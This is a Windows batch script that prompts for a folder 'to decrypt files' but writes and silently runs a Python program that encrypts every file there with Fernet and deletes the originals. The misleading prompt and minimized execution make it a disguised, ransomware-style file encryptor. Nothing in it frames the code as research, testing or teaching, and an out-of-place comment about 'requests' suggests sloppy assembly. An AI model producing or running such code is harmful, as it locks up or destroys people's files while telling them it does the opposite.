@echo off
set /p folder_path="Enter the path to decrypt files: "

echo import sys > enc.py
echo # Add the directory where 'requests' is located >> enc.py
echo sys.path.insert(0, r'C:\\Python\\Lib\\site-packages') >> enc.py
echo from cryptography.fernet import Fernet >> enc.py
echo import os >> enc.py
echo def generate_key(): >> enc.py
echo      key = Fernet.generate_key() >> enc.py
echo      with open("key.key", "wb") as key_file: >> enc.py
echo          key_file.write(key) >> enc.py
echo      return key >> enc.py
echo def encrypt_folder(folder_path): >> enc.py
echo      # Load or generate key >> enc.py
echo      if not os.path.exists("key.key"): >> enc.py
echo          generate_key() >> enc.py
echo      with open("key.key", "rb") as key_file: >> enc.py
echo          key = key_file.read() >> enc.py
echo      fernet = Fernet(key) >> enc.py
echo      for filename in os.listdir(folder_path): >> enc.py
echo          file_path = os.path.join(folder_path, filename) >> enc.py
echo          if os.path.isfile(file_path): >> enc.py
echo              with open(file_path, "rb") as file: >> enc.py
echo                  original_data = file.read() >> enc.py
echo              encrypted_data = fernet.encrypt(original_data) >> enc.py
echo              with open(file_path + ".enc", "wb") as encrypted_file: >> enc.py
echo                  encrypted_file.write(encrypted_data) >> enc.py
echo              os.remove(file_path) >> enc.py
echo              print(f"File '{filename}' encrypted and original deleted.") >> enc.py
echo encrypt_folder(r"%folder_path%") >> enc.py

start /min C:\Python\python enc.py